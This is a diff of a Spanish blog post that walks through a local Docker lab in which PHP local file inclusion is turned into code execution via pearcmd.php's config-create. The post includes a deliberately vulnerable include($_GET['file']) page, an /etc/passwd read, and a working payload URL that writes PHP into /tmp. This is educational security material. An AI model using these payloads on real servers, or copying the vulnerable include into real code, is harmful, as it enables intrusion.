       <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
       <line x1="7" y1="7" x2="7" y2="7"></line>
-   </svg><span class="tag"><a href="https://maxibelino.github.io/es/tags/test">test</a></span></p>
+   </svg><span class="tag"><a href="https://maxibelino.github.io/es/tags/lfi">LFI</a></span><span class="tag"><a href="https://maxibelino.github.io/es/tags/php">php</a></span><span class="tag"><a href="https://maxibelino.github.io/es/tags/rce">RCE</a></span><span class="tag"><a href="https://maxibelino.github.io/es/tags/vulnerability">vulnerability</a></span></p>
 <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
       stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
       <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
@@ -204,12 +217,12 @@
       <line x1="16" y1="13" x2="8" y2="13"></line>
       <line x1="16" y1="17" x2="8" y2="17"></line>
       <polyline points="10 9 9 9 8 9"></polyline>
-   </svg>5 Palabras
+   </svg>2202 Palabras
     … ⏲ Reading Time:
     
     
     
-    1 Second</p>
+    10 Minutes</p>
 <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
       stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
       <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
@@ -219,7 +232,425 @@
    </svg>2024-11-27 15:23 -0300</p></div>
 			<hr class="post-end">
 			<div class="content">
-				<p>Este post es en español</p>
+				<p><em>John Hammond Youtube video <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+<h1 id="1-objetivo">1. Objetivo<a href="#1-objetivo" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<p>Vamos a probar como un LFI nos llevará a un RCE vía una vulnerabilidad de PHP.</p>
+<p>El problema existe hasta la versión PHP 7.3 y esto fue reportado en el año 2021.</p>
+<blockquote>
+<p>La página está en otro idioma y John H. la ha traducido con Google al Inglés. Este documento lo he armado en base a su vídeo en Youtube.</p>
+</blockquote>
+<h2 id="11-laboratorio-local">1.1. Laboratorio local<a href="#11-laboratorio-local" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Para hacer las pruebas nos vamos a crear una imagen que cuente con PHP, con esta crearemos un contenedor Docker que contenga una página con un LFI.</p>
+<p>Luego, abusaremos de un <em>.php</em> que existe por defecto y es una especie de consola, y según los parámetros que le demos ejecutará distintos comandos, por ejemplo nos permite crear archivos, por lo cual podremos crear archivos con extensión <em>.php</em> que luego al solicitar con el navegador nos permitirá crear una webshell.</p>
+<blockquote>
+<p>Normalmente usamos técnicas de <em>log poisoning</em> para ir de un LFI a RCE, este no es el caso.</p>
+</blockquote>
+<p><img src="media/image31.png">{width=&ldquo;5.338542213473316in&rdquo; height=&ldquo;1.4188812335958005in&rdquo;}</p>
+<h2 id="12-blog-de-origen">1.2. Blog de origen<a href="#12-blog-de-origen" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p><img src="media/image51.png">{width=&ldquo;5.411458880139983in&rdquo; height=&ldquo;2.2922287839020123in&rdquo;}</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p>
+<p>Traducción:</p>
+<p><a href="https://www-leavesongs-com.translate.goog/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=es-419&_x_tr_pto=wapp">https://www-leavesongs-com.translate.goog/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=es-419&amp;_x_tr_pto=wapp</a></p>
+<p>Lo interesante viene acá:</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
+<h3 id="121-autor-en-twitter-x">1.2.1 Autor en twitter (X)<a href="#121-autor-en-twitter-x" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p><img src="media/image1.png">{width=&ldquo;4.057292213473316in&rdquo; height=&ldquo;2.284753937007874in&rdquo;}</p>
+<h1 id="2-creando-nuestro-laboratorio-local">2. Creando nuestro Laboratorio Local<a href="#2-creando-nuestro-laboratorio-local" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<p>Para poder hacer las pruebas en un laboratorio local necesitamos:</p>
+<ul>
+<li>
+<p>Crear un contenedor</p>
+</li>
+<li>
+<p>Crear algunos archivos para testear</p>
+</li>
+</ul>
+<h2 id="21-archivos-y-contenedores">2.1. Archivos y contenedores<a href="#21-archivos-y-contenedores" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Con nuestro <em>Dockerfile</em> crearemos una imagen y a partir de esta crearemos contenedores Docker (con 1 solo nos alcanza).</p>
+<p>Archivo: Dockerfile</p>
+<pre tabindex="0"><code>FROM php:7.0.0
+COPY app/* /var/www/html/
+WORKDIR /var/www/html/
+CMD [&#34;php&#34;, &#34;-S&#34;, &#34;0.0.0.0:8000&#34;]
+</code></pre><p>En el <em>index.php</em> generamos la vulnerabilidad, usaremos <em>include</em> para
+poder tener LFI.</p>
+<p>Archivo: index.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl"> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>Archivo: phpinfo.php</p>
+<pre tabindex="0"><code>&lt;?php
+ phpinfo();
+?&gt;
+</code></pre><p>Creamos el dir <strong>app/</strong> y movemos los archivos <em>.php</em> al mismo:</p>
+<p><img src="media/image5.png">{width=&ldquo;5.026042213473316in&rdquo; height=&ldquo;4.259200568678915in&rdquo;}</p>
+<h2 id="22-contenedor">2.2. Contenedor<a href="#22-contenedor" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="221-build-de-la-imagen-desde-nuestro-dockerfile">2.2.1. Build de la imagen desde nuestro Dockerfile<a href="#221-build-de-la-imagen-desde-nuestro-dockerfile" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Usaremos el tag = LFi 2 RCE → <strong>phplfi2rce</strong></p>
+<pre tabindex="0"><code>docker build -t phplfi2rce .
+</code></pre><p>(hay un punto al final del comando indicando el directorio actual)</p>
+<p><img src="media/image66.png">{width=&ldquo;4.584385389326334in&rdquo; height=&ldquo;1.0866688538932634in&rdquo;}</p>
+<p>Hacemos el build</p>
+<p><img src="media/image17.png">{width=&ldquo;4.652179571303587in&rdquo; height=&ldquo;3.7217432195975504in&rdquo;}</p>
+<p>Listamos las imágenes Docker disponibles localmente:</p>
+<pre tabindex="0"><code>docker images
+</code></pre><p><img src="media/image29.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.125in&rdquo;}</p>
+<h3 id="222-iniciamos-un-contenedor-desde-la-imagen-que-hemos-creado">2.2.2. Iniciamos un contenedor desde la imagen que hemos creado<a href="#222-iniciamos-un-contenedor-desde-la-imagen-que-hemos-creado" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Iniciar el contenedor-</p>
+<pre tabindex="0"><code>docker run -p 8000:8000 phplfi2rce
+</code></pre><h3 id="223-probamos-el-servicio-en-el-puerto-8000">2.2.3. Probamos el servicio en el puerto 8000<a href="#223-probamos-el-servicio-en-el-puerto-8000" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Visitamos nuestra página vulnerable <em>index.php</em></p>
+<p><img src="media/image24.png">{width=&ldquo;4.760416666666667in&rdquo; height=&ldquo;1.71875in&rdquo;}</p>
+<h3 id="224-comprobamos-el-lfi">2.2.4. Comprobamos el LFI<a href="#224-comprobamos-el-lfi" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Probamos el <em>Local File Inclusion</em> con el archivo <em>/etc/passwd</em></p>
+<p>URL:</p>
+<pre tabindex="0"><code>http://127.0.0.1:8000/index.php?file=/etc/passwd
+</code></pre><p>O lo que es lo mismo:</p>
+<pre tabindex="0"><code>http://localhost:8000/?file=/etc/passwd
+</code></pre><p><img src="media/image19.png">{width=&ldquo;5.526042213473316in&rdquo; height=&ldquo;1.578869203849519in&rdquo;}</p>
+<p>En la consola vemos:</p>
+<p><img src="media/image4.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.9444444444444444in&rdquo;}</p>
+<h3 id="225-accedemos-al-phpinfophp">2.2.5. Accedemos al phpinfo.php<a href="#225-accedemos-al-phpinfophp" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Visitamos la página del phpinfo.php</p>
+<pre tabindex="0"><code>http://localhost:8000/phpinfo.php
+</code></pre><p><img src="media/image9.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;3.3194444444444446in&rdquo;}</p>
+<h1 id="3-variables-argc-y-argv">3. Variables argc y argv<a href="#3-variables-argc-y-argv" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<p>En la página del phpinfo.php, busquemos por las variables que hace referencia el blog (argc y argv)</p>
+<p>argc → contar argumentos</p>
+<p>argv → valores de los argumentos</p>
+<p><img src="media/image46.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.2777777777777778in&rdquo;}</p>
+<p>La siguiente es un <em>array</em>:</p>
+<p><img src="media/image53.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.7777777777777778in&rdquo;}</p>
+<p>Si en la URL le pasamos después del signo de pregunta &lsquo;?&rsquo; un texto como &ldquo;<em>cualquiercosa</em>&rdquo; lo veremos reflejado en el <em>array</em>.</p>
+<p><img src="media/image40.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;2.2083333333333335in&rdquo;}</p>
+<p>Esta es la petición que llega al servidor web (un server PHP en el contenedor):</p>
+<p><img src="media/image45.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.4305555555555556in&rdquo;}</p>
+<h2 id="31-qué-ha-sucedido">3.1. Qué ha sucedido<a href="#31-qué-ha-sucedido" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>El blog (traducido al inglés) explica lo siguiente:</p>
+<blockquote>
+<p>Si en la URL ponemos un texto, lo vemos reflejado en la página del <em>phpinfo</em>, es decir el texto que escribimos se está cargando en el contenido del array $_SERVER[&lsquo;argv&rsquo;].</p>
+</blockquote>
+
+    <aside class="admonition tip">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+   </svg></div><b>Eso significa que:</b>
+        </div>
+        <div class="admonition-content">&ldquo;hemos visitado la función del <em>pearcmd.php</em> a través de la web y hemos sido capaces de controlar los parámetros enviados a la línea de comandos.&rdquo;</div>
+    </aside>
+<h1 id="4-acerca-del-archivo-pearcmdphp">4. Acerca del archivo pearcmd.php<a href="#4-acerca-del-archivo-pearcmdphp" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<h2 id="41-cuál-es-la-idea">4.1. Cuál es la idea<a href="#41-cuál-es-la-idea" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+    <aside class="admonition note">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-edit-2">
+      <path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path>
+   </svg></div><b>Obs</b>
+        </div>
+        <div class="admonition-content">Una vez más, leer lo anterior, donde dice &ldquo;Qué ha sucedido&rdquo;.</div>
+    </aside>
+<p>Si hacemos LFI de ese archivo <em>pearcmd.php</em> se invocará, es decir, se va a interpretar, pues tiene extensión PHP; y lo interesante es que a ese archivo le podemos pasar una lista de argumentos (de los que tiene habilitados el archivo), que podremos controlar a través del <em>output</em> que vemos en el array visto en el <em>phpinfo</em>.</p>
+
+    <aside class="admonition success">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle">
+      <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+      <polyline points="22 4 12 14.01 9 11.01"></polyline>
+   </svg></div><b></b>
+        </div>
+        <div class="admonition-content">Al escribir la salida del <em>array</em> (que vemos en el <em>phpinfo</em>) estamos escribiendo o eligiendo los argumentos que va a tomar el <em>pearcmd.php</em>.</div>
+    </aside>
+<p>El archivo pearcmd.php está en la ruta: /usr/local/lib/php</p>
+<p>Se invoca ejecutando:</p>
+<pre tabindex="0"><code>php pearcmd.php
+</code></pre><h2 id="42-veamos-el-archivo-desde-dentro-del-contenedor">4.2. Veamos el archivo desde dentro del contenedor<a href="#42-veamos-el-archivo-desde-dentro-del-contenedor" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="421-entrar-al-contenedor">4.2.1. Entrar al contenedor<a href="#421-entrar-al-contenedor" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Primero obtenemos el ID del contenedor</p>
+<p><img src="media/image21.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.0833333333333333in&rdquo;}</p>
+<p>Entramos al contenedor</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker <span class="nb">exec</span> -it &lt;ID&gt; /bin/bash
+</span></span></code></pre></div><p>En mi máquina:</p>
+<p><img src="media/image22.png">{width=&ldquo;5.557292213473316in&rdquo; height=&ldquo;1.9201268591426073in&rdquo;}</p>
+<p>Ya dentro del contenedor, listamos el directorio:</p>
+<p><img src="media/image16.png">{width=&ldquo;5.567708880139983in&rdquo; height=&ldquo;0.4817322834645669in&rdquo;}</p>
+<h3 id="422-comandos-que-puede-ejecutar-el-pearcmdphp">4.2.2. Comandos que puede ejecutar el pearcmd.php<a href="#422-comandos-que-puede-ejecutar-el-pearcmdphp" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>A este <em>php</em> lo podemos invocar usando el comando:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php &lt;ruta al archivo pearcmd.php&gt;
+</span></span></code></pre></div><p>La salida es la lista de comandos/argumentos que puede tomar:
+<img src="media/image43.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;2.611111111111111in&rdquo;}</p>
+<p>Observar esta opción en particular:</p>
+<p><img src="media/image67.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.2916666666666667in&rdquo;}</p>
+<h3 id="423-código-fuente-del-pearcmdphp">4.2.3. Código fuente del pearcmd.php<a href="#423-código-fuente-del-pearcmdphp" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Si nos copiamos el código fuente del pearcmd.php</p>
+<p><img src="media/image6.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;3.6944444444444446in&rdquo;}</p>
+<h3 id="424-análisis-del-config-create">4.2.4. Análisis del config-create<a href="#424-análisis-del-config-create" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>El autor del blog analiza el código del <em>config-create</em> y dice:</p>
+<p><img src="media/image69.png">{width=&ldquo;6.239583333333333in&rdquo; height=&ldquo;1.6979166666666667in&rdquo;}</p>
+<p>El <strong>config-create</strong> necesita de 2 argumentos o parámetros:</p>
+<ul>
+<li>
+<p>el segundo parámetro es el nombre del archivo con el <em>file path</em> que se va a escribir (llamémosle &ldquo;pepe&rdquo;, entonces /file/path/a/pepe)</p>
+</li>
+<li>
+<p>el primer parámetro será el contenido de lo que se escribe dentro del archivo &ldquo;pepe&rdquo;. Es decir, a través de <em>pearcmd.php</em> podemos crear un nuevo archivo (por ejemplo con extensión .php) con el contenido que queramos.</p>
+</li>
+</ul>
+<h1 id="5-ejecución-de-pearcmdphp">5. Ejecución de pearcmd.php<a href="#5-ejecución-de-pearcmdphp" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<p>En el blog, el autor usa un HTTP GET para realizar el <em>request</em> (John H. crea con este código un <em>request</em> en Python).</p>
+<p>Tenemos que usar el parámetro <strong>file</strong> que es el con el que tenemos LFI y los dos parámetros que necesita <em>&ldquo;config-create</em>&rdquo;:</p>
+<p><img src="media/image23.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.875in&rdquo;}</p>
+<ol>
+<li>
+<p>El LFI invoca a través de &ldquo;file&rdquo; al pearcmd.php</p>
+</li>
+<li>
+<p>Subrayado en rojo el contenido a escribir</p>
+</li>
+<li>
+<p>Subrayado en celeste el archivo de salida.</p>
+</li>
+</ol>
+<h2 id="51-opción-1---utilizar-el-navegador-para-hacer-el-request-y-crear-un-archivo-dentro-del-contenedor">5.1. Opción 1 - Utilizar el navegador para hacer el request y crear un archivo dentro del contenedor<a href="#51-opción-1---utilizar-el-navegador-para-hacer-el-request-y-crear-un-archivo-dentro-del-contenedor" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Crearemos un archivo .php dentro del contenedor.</p>
+<p>La URL a visitar es:</p>
+<pre tabindex="0"><code>http://127.0.0.1:8000/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php
+</code></pre><p><img src="media/image70.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.4861111111111112in&rdquo;}</p>
+<p>El mensaje es de éxito.</p>
+<p>Verificamos si se creó el archivo en el /tmp/hello.php dentro del contenedor:</p>
+<p><img src="media/image12.png">{width=&ldquo;5.447916666666667in&rdquo; height=&ldquo;1.2395833333333333in&rdquo;}</p>
+<p>→ ok, tenemos el archivo <em>hello.php</em> dentro del contenedor</p>
+<p>Veamos el contenido:</p>
+<p><img src="media/image62.png">{width=&ldquo;5.177083333333333in&rdquo; height=&ldquo;1.5729166666666667in&rdquo;}</p>
+<h1 id="6-hacer-un-archivo-de-prueba-php-sin-usar-config-create-que-nos-dé-ejecución-de-comandos">6. Hacer un archivo de prueba .php (sin usar config-create) que nos dé ejecución de comandos<a href="#6-hacer-un-archivo-de-prueba-php-sin-usar-config-create-que-nos-dé-ejecución-de-comandos" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<p>Vamos a hacer una primera prueba que es crear el archivo <em>test.php</em> directamente en el directorio /tmp/ del contenedor:</p>
+<ol>
+<li>
+<p><strong>estando en una consola del contenedor</strong></p>
+</li>
+<li>
+<p><strong>sin usar</strong> el config-create del pearcmd.php</p>
+</li>
+</ol>
+<p>Entonces:</p>
+<ol>
+<li>Creamos el archivo <em>test.php</em> que ejecuta el comando ls</li>
+</ol>
+<p>En el contenedor, ejecutamos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&lt;?php system(&#39;ls -l&#39;) ?&gt;&#34;</span> &gt; test.php
+</span></span></code></pre></div><p><img src="media/image58.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.25in&rdquo;}</p>
+<p>Visitamos la página:</p>
+<p><img src="media/image27.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.0138888888888888in&rdquo;}</p>
+<p>→ ok, se ejecutó el &rsquo;ls&rsquo;</p>
